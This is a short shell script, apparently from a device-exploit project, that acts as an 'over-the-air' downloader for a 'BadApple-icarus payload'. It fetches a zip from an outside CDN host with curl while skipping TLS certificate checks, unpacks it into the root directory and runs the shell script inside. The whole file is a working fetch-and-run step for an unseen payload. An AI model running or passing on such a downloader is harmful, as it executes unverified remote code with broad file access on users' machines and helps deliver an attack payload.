#!/bin/sh

# written by appleflyer
# ota stands for over-the-air, because this payload is intended only to be used over the air, so the user does not need to take the trouble to manually download the zip file and unzip it and stuff

CDN_DOMAIN="cdn.fanqyxl.net"

mexit(){
	printf "$1\n"
	printf "exiting... please report this issue to appleflyer on discord.\n"
	exit
}


main(){
	echo "starting the BadApple-icarus payload downloader..."
	cd /
	echo "downloading the icarus payload..."
	curl -SLk -o icarus_ba.zip "${CDN_DOMAIN}/icarus_ba.zip" || mexit "error occured whilst downloading icarus payload. is your wifi working / did you connect to wifi?"
	echo "payload successfully downloaded."
	unzip icarus_ba.zip || mexit "error unzipping the payload."
	echo "payload unzipped."
	[ ! -d "/icarus" ] && mexit "the payload folder does not exist. this should not have happened."
	cd /icarus
	echo "starting the BadApple-icarus payload..."
	./icarus_ba.sh
	mexit "if you reached here, something went VERY wrong."
}

main
